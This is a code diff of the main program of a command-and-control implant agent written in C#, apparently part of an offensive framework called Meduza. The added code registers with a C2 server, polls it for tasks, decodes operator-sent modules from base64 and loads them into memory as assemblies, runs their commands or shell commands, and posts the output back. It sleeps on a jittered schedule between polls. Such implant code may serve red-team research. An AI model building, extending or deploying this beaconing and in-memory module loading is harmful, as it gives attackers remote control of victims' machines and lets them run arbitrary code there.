@@ -1,5 +1,4 @@
-﻿using Agent;
-using Agent.Models;
+﻿using Agent.Models;
 using Agent.Services;
 using System.Collections.Concurrent;
 using System.Diagnostics;
@@ -7,8 +6,20 @@ using System.IO.Pipes;
 using Agent.ModuleBase;
 using Agent.Models.C2Request;
 using System.Text.Json;
+using Agent.Core;
+using System.Reflection;
+using Meduza.Agent;
+using Agent.Core.Utils.MessageTransformer;
+using Agent.Core.Utils.Encoding;
 
+
+// #if TYPE_http
 AgentInformationService agentInformationService = new AgentInformationService();
+
+// Decorator
+var baseTransformer = new BaseTransformer();
+var urlSafeBase64EncodingDecorator = new UrlSafeBase64EncodingDecorator(baseTransformer);
+var urlSafeBase64DecodingDecorator = new UrlSafeBase64DecodingDecorator(baseTransformer);
 
 // Queues, random and agentInfo 
 var taskQueue = new ConcurrentQueue<AgentTask>();
@@ -22,27 +33,34 @@ var agentInfo = await agentInformationService.GetAgentInfoAsync();
 // Load the embedded config
 var baseConfig = ConfigLoader.LoadEmbeddedConfig();
 
-// Initialize baseConfig agentID and other variables
 if (agentInfo is not null)
 {
-    baseConfig.AgentId = agentInfo.AgentId;
+    baseConfig.AgentId = agentInfo.AgentId ?? string.Empty;
 }
+
+// TEMP
+string jsonOutput = JsonSerializer.Serialize(baseConfig);
+
+// Write the JSON output to the console
+Console.WriteLine(jsonOutput);
+//
 
 var delay = baseConfig.Sleep;
 var jitter = baseConfig.Jitter;
 
 // Contact request 
-var request = new C2Request
+var registerRequest = new C2Request
 {
-    AgentId = baseConfig.AgentId,
-    AgentStatus = AgentStatus.Stage1,
     Reason = C2RequestReason.Register,
+    AgentId = baseConfig.AgentId ?? string.Empty,
+    ConfigId = baseConfig.AgentConfigId ?? string.Empty,
+    AgentStatus = AgentStatus.Active,
     Message = JsonSerializer.Serialize(agentInfo)
 };
 
 // Init contact request
 var baseCommunicationService = new CommunicationService(baseConfig);
-var registrationResult = await baseCommunicationService.SimplePostAsync("checkin", JsonSerializer.Serialize(request));
+var registrationResult = await baseCommunicationService.SimplePostAsync("/", JsonSerializer.Serialize(registerRequest));
 
 if (registrationResult is null)
 {
@@ -56,12 +74,112 @@ while (true)
     {
         using (var client = new HttpClient())
         {
+            if (baseCommunicationService.BaseConfig is null)
+            {
+                Console.WriteLine("BaseConfig is null.");
+                Environment.Exit(1);
+            }
 
+            var taskRequest = new C2Request { Reason = C2RequestReason.Task, AgentId = baseCommunicationService.BaseConfig.AgentId, AgentStatus = AgentStatus.Active };
+            var result = await baseCommunicationService.SimplePostAsync($"/", JsonSerializer.Serialize(taskRequest));
+
+            if (!string.IsNullOrWhiteSpace(result))
+            {
+                var taskResponse = JsonSerializer.Deserialize<C2Request>(result);
+                if (taskResponse is null) continue;
+                //var decryptedResult = xorDecryptionBase64DecodingDecorator.Transform(taskResponse.Message);
+                var tasks = JsonSerializer.Deserialize<List<AgentTask>>(taskResponse.Message);
+                if (tasks is null || tasks.Count == 0) continue;
+
+                foreach (var task in tasks)
+                {
+                    if (task is null) continue;
+
+                    if (task.TaskCompleted > DateTime.MinValue) continue;
+
+                    Console.WriteLine(JsonSerializer.Serialize(task));
+
+                    if (!string.IsNullOrWhiteSpace(task.Module) && task.Status is not AgentTaskStatus.Running)
+                    {
+                        task.QueueRunningStatus(messageQueue, messageQueueLock);
+
+                        ModuleLoadContext loadContext = new();
+                        using (var stream = new MemoryStream())
+                        {
+                            var decodedModule = Convert.FromBase64String(task.Module);
+                            // var decodedModule = urlSafeBase64DecodingDecorator.Transform(task.Module);
+                            stream.Write(decodedModule);
+                            loadContext.AssemblyBytes = stream;
+                            stream.Position = 0;
+                            var loadedAssembly = loadContext.LoadFromStream(stream);
+
+                            // var decryptedModule = xorDecryptionDecorator.Transform(decodedModule);
+                            // var decryptedBytes = System.Text.Encoding.UTF8.GetBytes(decryptedModule);
+                            var module = ModuleLoader.LoadModule(Assembly.Load(decodedModule));
+                            foreach (var moduleCommand in module.Commands)
+                            {
+                                try
+                                {
+                                    task.Command.Output = ExecuteCommand(moduleCommand, task.Command.Parameters, task.IsCancellationTokenSourceSet);
+                                }
+                                catch (Exception)
+                                {
+                                    while (commandOutputQueue.TryDequeue(out var commandOutputResult))
+                                    {
+                                        task.Command.Output += commandOutputResult;
+                                    }
+                                }
+                            }
+                        }
+
+                        task.Module = string.Empty;
+                    }
+
+                    lock (taskQueueLock)
+                    {
+                        if (task is not null)
+                            taskQueue.Enqueue(task);
+                    }
+
+                    if (task!.Status is not AgentTaskStatus.Running)
+                        task!.QueueQueuedStatus(messageQueue, messageQueueLock);
+                }
+
+                await HandleQueuedTasks();
+
+                // Flush message queue for now
+                List<AgentTask?> agentTasks = [];
+                lock (messageQueueLock)
+                {
+                    while (messageQueue.TryDequeue(out var queueData))
+                    {
+                        if (queueData is not null)
+                            agentTasks.Add(queueData);
+                    }
+                }
+
+                foreach (var agentTask in agentTasks)
+                {
+                    var taskUpdateRequest = new C2Request
+                    {
+                        AgentId = baseCommunicationService.BaseConfig.AgentId,
+                        AgentStatus = AgentStatus.Active,
+                        Reason = C2RequestReason.Response,
+                        Message = JsonSerializer.Serialize(agentTask)
+                    };
+
+                    await baseCommunicationService.SimplePostAsync("/", JsonSerializer.Serialize(taskUpdateRequest));
+                }
+            }
+            else
+            {
+                Console.WriteLine($"[{DateTime.UtcNow}]:\tDid not connect to server");
+            }
+
+            int realJitter = delay * (jitter / 100);
+            if (rnd.Next(2) == 0) { realJitter = -realJitter; }
+            Thread.Sleep((delay + realJitter) * 1000);
         }
-
-        int realJitter = delay * (jitter / 100);
-        if (rnd.Next(2) == 0) { realJitter = -realJitter; }
-        Thread.Sleep((delay + realJitter) * 1000);
     }
     catch (Exception ex)
     {
@@ -107,6 +225,8 @@ async Task HandleTask(AgentTask task)
 }
 
 // Command execution logic
+// TODO redo logic to use cancellationtoken rather than tokensource
+
 string ExecuteCommand(ICommand command, string[]? parameters, bool IsCancellationTokenSourceSet)
 {
     const int delay = 1;
@@ -180,7 +300,6 @@ string ExecuteCommand(ICommand command, string[]? parameters, bool IsCancellatio
     return output;
 }
 
-// If web terminal param is set to "shell" execute with:
 async Task<string> ExecuteShellCommand(string[] commandParameters, bool IsCancellationTokenSourceSet = false)
 {
     ArgumentNullException.ThrowIfNull(commandParameters, nameof(commandParameters));
@@ -231,3 +350,8 @@ async Task<string> ExecuteShellCommand(string[] commandParameters, bool IsCancel
 
     return output;
 }
+// #elif TYPE_tcp
+
+// #else
+
+// #endif
